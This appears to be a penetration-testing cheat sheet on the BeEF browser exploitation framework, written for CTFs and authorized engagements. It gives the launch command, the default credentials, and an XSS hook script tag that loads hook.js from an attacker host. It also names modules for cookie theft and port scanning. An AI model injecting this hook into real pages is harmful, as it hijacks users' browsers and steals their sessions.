## Purpose
BeEF (Browser Exploitation Framework) is a penetration testing tool that hooks browsers using malicious JavaScript, allowing command-and-control of the victim’s browser.

## Scenarios
- CTF: Inject a BeEF hook script into a challenge page to gain a hooked browser session and extract cookies or keystrokes.  
- Real world: Demonstrate the impact of XSS by showing persistence, social engineering, or data exfiltration in a controlled engagement.

## All needed info to run
- Start BeEF: `beef-xss` (runs web UI on http://127.0.0.1:3000/ui/panel).  
- Default creds: `beef` / `beef`.  
- Hook script: `<script src="http://<attacker-ip>:3000/hook.js"></script>`. Place this in vulnerable page.  
- After a victim loads page, their browser appears in the BeEF panel.  
- Modules allow exploits like alert popups, stealing cookies, launching port scans.  
- Config file: `/etc/beef-xss/config.yaml` for passwords/ports.

## Example commands & outputs
```bash
# Start BeEF
$ beef-xss
# Output:
# [*] BeEF server started (http://127.0.0.1:3000/ui/panel)

# Insert hook in vulnerable page
<script src="http://192.168.56.101:3000/hook.js"></script>

# BeEF panel shows hooked browser:
# IP: 192.168.56.102 | Browser: Firefox | OS: Linux
# Modules list available exploitation options
```

!!! note "BeEF Basics"
	- Insert the `<script>` hook into an XSS-vulnerable page to hook a browser.
	- BeEF is noisy — alerts and modules are obvious to the victim.
	- Default creds are `beef` / `beef`; change in config for security.
	- Only use BeEF for demos or authorized pentests; hooking random browsers is illegal.
